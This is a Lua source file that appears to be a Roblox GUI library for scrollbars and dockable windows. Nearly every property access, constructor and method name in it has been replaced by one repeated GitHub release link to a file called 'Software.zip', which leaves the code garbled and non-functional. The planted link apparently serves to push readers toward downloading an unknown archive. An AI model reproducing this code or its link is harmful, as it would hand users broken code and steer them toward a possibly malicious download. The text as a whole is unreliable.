				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,self:GetScrollPercent()*(fs-bs)/fs,0)
			end
		end

		local function createFrame(self)
			local newFrame = createSimple("Frame",{Style=0,Active=true,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.35294118523598,0.35294118523598,0.35294118523598),BackgroundTransparency=0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,0),Rotation=0,Selectable=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="ScrollBar",})
			local button1 = nil
			local button2 = nil

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,16)
				button1 = createSimple("ImageButton",{
					Parent = newFrame,
					Name = "Left",
					Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					AutoButtonColor = false
				})
				createArrow(16,4,"left").Parent = button1
				button2 = createSimple("ImageButton",{
					Parent = newFrame,
					Name = "Right",
					Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,0),
					Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					AutoButtonColor = false
				})
				createArrow(16,4,"right").Parent = button2
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,0)
				button1 = createSimple("ImageButton",{
					Parent = newFrame,
					Name = "Up",
					Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					AutoButtonColor = false
				})
				createArrow(16,4,"up").Parent = button1
				button2 = createSimple("ImageButton",{
					Parent = newFrame,
					Name = "Down",
					Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,1,-16),
					Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,16),
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					AutoButtonColor = false
				})
				createArrow(16,4,"down").Parent = button2
			end

			local scrollThumbFrame = createSimple("Frame",{
				BackgroundTransparency = 1,
				Parent = newFrame
			})
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-32,1,0)
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,16)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,-32)
			end

			local scrollThumb = createSimple("Frame",{
				BackgroundColor3 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(120/255,120/255,120/255),
				BorderSizePixel = 0,
				Parent = scrollThumbFrame
			})

			local markerFrame = createSimple("Frame",{
				BackgroundTransparency = 1,
				Name = "Markers",
				Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0),
				Parent = scrollThumbFrame
			})

			local buttonPress = false
			local thumbPress = false
			local thumbFramePress = false

			--local thumbColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(120/255,120/255,120/255)
			--local thumbSelectColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(140/255,140/255,140/255)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not buttonPress and self:CanScrollUp() then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.8 end
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or not self:CanScrollUp() then return end
				buttonPress = true
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
				if self:CanScrollUp() then self:ScrollUp() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
				local buttonTick = tick()
				local releaseEvent
				releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
					releaseEvent:Disconnect()
					if checkMouseInGui(button1) and self:CanScrollUp() then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.8 else https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1 end
					buttonPress = false
				end)
				while buttonPress do
					if tick() - buttonTick >= 0.3 and self:CanScrollUp() then
						self:ScrollUp()
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
					end
					wait()
				end
			end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not buttonPress then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1 end
			end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not buttonPress and self:CanScrollDown() then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.8 end
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or not self:CanScrollDown() then return end
				buttonPress = true
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
				if self:CanScrollDown() then self:ScrollDown() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
				local buttonTick = tick()
				local releaseEvent
				releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
					releaseEvent:Disconnect()
					if checkMouseInGui(button2) and self:CanScrollDown() then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.8 else https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1 end
					buttonPress = false
				end)
				while buttonPress do
					if tick() - buttonTick >= 0.3 and self:CanScrollDown() then
						self:ScrollDown()
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
					end
					wait()
				end
			end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not buttonPress then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1 end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not thumbPress then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.2 https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

				local dir = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and "X" or "Y"
				local lastThumbPos = nil

				buttonPress = false
				thumbFramePress = false			
				thumbPress = true
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
				local mouseOffset = mouse[dir] - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[dir]
				local mouseStart = mouse[dir]
				local releaseEvent
				local mouseEvent
				releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
					releaseEvent:Disconnect()
					if mouseEvent then mouseEvent:Disconnect() end
					if checkMouseInGui(scrollThumb) then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.2 else https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0 https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end
					thumbPress = false
				end)
				self:Update()

				mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and thumbPress and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						local thumbFrameSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[dir]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[dir]
						local pos = mouse[dir] - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[dir] - mouseOffset
						if pos > thumbFrameSize then
							pos = thumbFrameSize
						elseif pos < 0 then
							pos = 0
						end
						if lastThumbPos ~= pos then
							lastThumbPos = pos
							self:ScrollTo(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5+pos/thumbFrameSize*(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)))
						end
						wait()
					end
				end)
			end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not thumbPress then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0 https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end
			end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or checkMouseInGui(scrollThumb) then return end

				local dir = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and "X" or "Y"
				local scrollDir = 0
				if mouse[dir] >= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[dir] + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[dir] then
					scrollDir = 1
				end

				local function doTick()
					local scrollSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - 1
					if scrollDir == 0 and mouse[dir] < https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[dir] then
						self:ScrollTo(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - scrollSize)
					elseif scrollDir == 1 and mouse[dir] >= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[dir] + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[dir] then
						self:ScrollTo(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + scrollSize)
					end
				end

				thumbPress = false			
				thumbFramePress = true
				doTick()
				local thumbFrameTick = tick()
				local releaseEvent
				releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
					releaseEvent:Disconnect()
					thumbFramePress = false
				end)
				while thumbFramePress do
					if tick() - thumbFrameTick >= 0.3 and checkMouseInGui(scrollThumbFrame) then
						doTick()
					end
					wait()
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				self:ScrollTo(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
				self:ScrollTo(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = scrollThumb
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = scrollThumbFrame
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = button1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = button2
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = markerFrame

			return newFrame
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,nocallback)
			local total = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local visible = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local index = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local button1 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local button2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,total-visible))

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				self:UpdateMarkers()
			end

			if self:CanScrollUp() then
				for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) do
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
				end
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
				for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) do
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
				end
			end
			if self:CanScrollDown() then
				for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) do
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
				end
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
				for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) do
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
				end
			end

			drawThumb(self)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local markerFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			markerFrame:ClearAllChildren()

			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				if i < https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					createSimple("Frame",{
						BackgroundTransparency = 0,
						BackgroundColor3 = v,
						BorderSizePixel = 0,
						Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,1,-6) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-6,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0),
						Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,6) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,1),
						Name = "Marker"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(i),
						Parent = markerFrame
					})
				end
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,ind,color)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[ind] = color or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,ind,nocallback)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = ind
			self:Update()
			if not nocallback then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			end
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			self:Update()
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			self:Update()
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip > 0
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip < https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,perc)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(perc*(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip))
			self:Update()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,data)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) do
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			end
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) do
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,frame)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil end
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() self:ScrollTo(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function() self:ScrollTo(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end)
		end

		local mt = {}
		mt.__index = funcs

		local function new(hor)
			local obj = setmetatable({
				Index = 0,
				VisibleSpace = 0,
				TotalSpace = 0,
				Increment = 1,
				WheelIncrement = 1,
				Markers = {},
				GuiElems = {},
				Horizontal = hor,
				LastTotalSpace = 0,
				Scrolled = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			},mt)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = createFrame(obj)
			obj:Texture({
				ThumbColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(60,60,60),
				ThumbSelectColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(75,75,75),
				ArrowColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),
				FrameColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(40,40,40),
				ButtonColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(75,75,75)
			})
			return obj
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local funcs = {}
		local static = {MinWidth = 200, FreeWidth = 200}
		local mouse = plr:GetMouse()
		local sidesGui,alignIndicator
		local visibleWindows = {}
		local leftSide = {Width = 300, Windows = {}, ResizeCons = {}, Hidden = true}
		local rightSide = {Width = 300, Windows = {}, ResizeCons = {}, Hidden = true}

		local displayOrderStart
		local sideDisplayOrder
		local sideTweenInfo = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.3,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		local tweens = {}
		local isA = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		local theme = {
			MainColor1 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(52,52,52),
			MainColor2 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(45,45,45),
			Button = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(60,60,60)
		}

		local function stopTweens()
			for i = 1,#tweens do
				tweens[i]:Cancel()
			end
			tweens = {}
		end

		local function resizeHook(self,resizer,dir)
			local guiMain = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					local isH = dir:find("[WE]") and true
					local isV = dir:find("[NS]") and true
					local signX = dir:find("W",1,true) and -1 or 1
					local signY = dir:find("N",1,true) and -1 or 1

					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and isV then return end

					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.5
					elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						local releaseEvent,mouseEvent

						local offX = mouse.X - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						local offY = mouse.Y - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = resizer
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1

						releaseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
								releaseEvent:Disconnect()
								mouseEvent:Disconnect()
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
							end
						end)

						mouseEvent = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
								self:StopTweens()
								local deltaX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - offX
								local deltaY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - offY

								if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + deltaX*signX < https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then deltaX = signX*(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end
								if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + deltaY*signY < https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then deltaY = signY*(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) end
								if signY < 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + deltaY < 0 then deltaY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end

								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,(signX < 0 and deltaX or 0),0,(signY < 0 and deltaY or 0))
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + (isH and deltaX*signX or 0)
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + (isV and deltaY*signY or 0)
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and 20 or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

								--if isH then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end
								--if isV then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end
							end
						end)
					end
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= resizer then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
				end
			end)
		end

		local updateWindows

		local function moveToTop(window)
			local found = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visibleWindows,window)
			if found then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visibleWindows,found)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visibleWindows,1,window)
				updateWindows()
			end
		end

		local function sideHasRoom(side,neededSize)
			local maxY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - 1) * 4)
			local inc = 0
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				inc = inc + (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 100)
